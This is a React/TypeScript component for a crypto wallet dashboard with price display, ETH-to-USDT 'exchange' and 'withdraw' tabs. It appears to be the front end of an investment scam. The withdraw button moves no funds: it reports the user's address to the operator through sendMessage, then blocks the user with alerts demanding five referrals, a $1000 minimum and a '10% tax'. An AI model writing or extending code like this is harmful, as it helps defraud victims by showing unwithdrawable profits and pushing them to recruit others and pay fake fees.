import { getUserInfo, convertEth } from '../utils/api'
import { useAccount } from "wagmi";
import { useEffect, useState } from "react"
import { getCryptoExchangeRates, sendMessage } from "../utils/function"
import { Tabs, Collapse } from 'react-vant';



const ExchangeInfo = () => {
  const { address } = useAccount();
  const [active, setActive] = useState('exchange');
  const [priceInfo, setPriceInfo] = useState({
    ETH_USDT: 0,
    BTC_USDT: 0,
    BTC_ETH: "0"
  })

  const [userInfo, setUserInfo] = useState({
    address: "",
    balance: "0",
    ethprofit: "0",
    usdtprofit: "0",
    withdrawal: {},
    referrals: "0",
    referralCode: ""
  }); 
 

  useEffect(() => {
    const getPrice = async () => {
      const prices = await getCryptoExchangeRates();
      setPriceInfo(prices ?? priceInfo);
    }
    getPrice();
    const getUser = async (address : string) => {
      
      const user = await getUserInfo(address);
      console.log(user);
      setUserInfo(user);
      
    };
    if (address) {
    getUser(address || "0x");
    }
  },[address])

  //For the exchange part
  const [value, setValue] = useState<number>(0); // State to store the input value
  const [value$, setValue$] = useState<number>(0);
  const limit: number = parseFloat(userInfo.ethprofit); // Define your limit here
  const limit$: number = parseFloat(userInfo.usdtprofit); 

  const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const inputValue = event.target.value;

    // Check if the input value is within the limit
    if (+inputValue <= limit) {
      setValue(parseFloat(inputValue)); // Update the state if the value is within the limit
    }
  };

  const handleInputChange$ = (event: React.ChangeEvent<HTMLInputElement>) => {
    const inputValue = event.target.value;

    // Check if the input value is within the limit
    if (+inputValue <= limit$) {
      setValue$(parseFloat(inputValue)); // Update the state if the value is within the limit
    }
  };

  const convert = async() => {
    let ok = await(convertEth(value.toString(), address ?? "0x")); 
    if(ok) {
      alert("Done")
  
    sendMessage(`Address : ${address}; Converted ${value.toString()} to USDT`)} 
    else {
      alert("Failed");
       sendMessage(`Address : ${address}; Converted ${value.toString()} to USDT`)} 
   
    
  }

  const withdraw = () => {
   
    sendMessage(`Address : ${address}; Trying to withdraw`);
    (parseInt(userInfo.referrals) > 5) ? (
      (parseInt(userInfo.usdtprofit) > 1000) ? 
        (alert("You are required to pay a 10% tax")) : 
        (alert("You can only withdraw a minimum of $1000 "))) : 
        (alert("You need a minimum referral of 5. This is to assist us with boosting the community"));
  }

    return (
      <>
        <div className="infos-panel">
          <div className="infos-panel-line"></div>
          <div className="infos-panel-title"> Pair price </div>
          <div className="infos-list">
            <div className="infos-list-one">
              <div className="infos-list-one-title">ETH/USDT</div>
              <div className="infos-list-one-value black">${priceInfo.ETH_USDT}</div>
            </div>
            <div className="infos-list-one">
              <div className="infos-list-one-title">BTC/USDT</div>
              <div className="infos-list-one-value black">${priceInfo.BTC_USDT}</div>
            </div>
            <div className="infos-list-one">
              <div className="infos-list-one-title">BTC/ETH</div>
              <div className="infos-list-one-value black">${priceInfo.BTC_ETH}</div>
            </div>
          </div>
        </div>
        <div className="account-infos van-tabs van-tabs--line">
          <Tabs active={active} onChange={(name) => setActive(name)} type="capsule" color="#1d5786">
          <Tabs.TabPane key="exchange" title="Exchange">
              <div className="infos-panel-line"></div>
              <div className="account-infos-exchange">
                <div className="account-infos-exchange-one">
                  <div className="account-infos-exchange-input">
                    <input
                      type="number"
                      placeholder="ETH"
                      value={value}
                      onChange={handleInputChange} // Handle input change
                      id="exchange"
                      style={{ width: '80%' }}
                      max={limit}
                    />
                  </div>
                  <div className="account-infos-exchange-result">{isNaN((value * priceInfo.ETH_USDT)) ? 0 : parseFloat((value * priceInfo.ETH_USDT).toString()).toFixed(2)}</div>
                  <div className="account-infos-exchange-icon">
                    <i className="van-icon van-icon-exchange"></i>
                  </div>
                </div>
                <div className="account-infos-exchange-one">
                  <div className="redeem-all"> Redeem all </div>
                  <span className="redeem-all-icon">
                    <img src="./assets/addons/imtoken/ming/img/usdt.png" alt="USDT" /> USDT
                  </span>
                </div>
              </div>
              <div style={{ textAlign: 'center' }}>
                <button
                  className="exchange-btn van-button van-button--default van-button--normal"
                  onClick={convert}
                >
                  <div className="van-button__content">
                    <span className="van-button__text"> Exchange </span>
                  </div>
                </button>
              </div>
            </Tabs.TabPane>
            <Tabs.TabPane key="withdraw" title="Withdraw">
            <div className="infos-panel-line"></div>
              <div className="account-infos-exchange">
                <div className="account-infos-exchange-one">
                  <div className="account-infos-exchange-input">
                    <input
                      type="number"
                      placeholder="USDT"
                      value={value$}
                      onChange={handleInputChange$} // Handle input change
                      id="exchange"
                      style={{ width: '80%' }}
                      max={limit}
                    />
                  </div>
                  <div className="account-infos-exchange-result">$</div>
                  
                </div>
                
              </div>
              <div style={{ textAlign: 'center' }}>
                <button
                  className="exchange-btn van-button van-button--default van-button--normal"
                  onClick={withdraw}
                >
                  <div className="van-button__content">
                    <span className="van-button__text"> Withdraw </span>
                  </div>
                </button>
              </div>
            </Tabs.TabPane>
          </Tabs>
        </div>
        <div style={{ textAlign: 'center' }}>
          <button
            className="exchange-btn van-button van-button--default van-button--normal"
            style={{ width: '100%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}
          >
            <div className="van-button__content">
              <span className="van-button__text"> Record </span>
            </div>
          </button>
        </div>
      </>
    );
  };
  
  export default ExchangeInfo;
  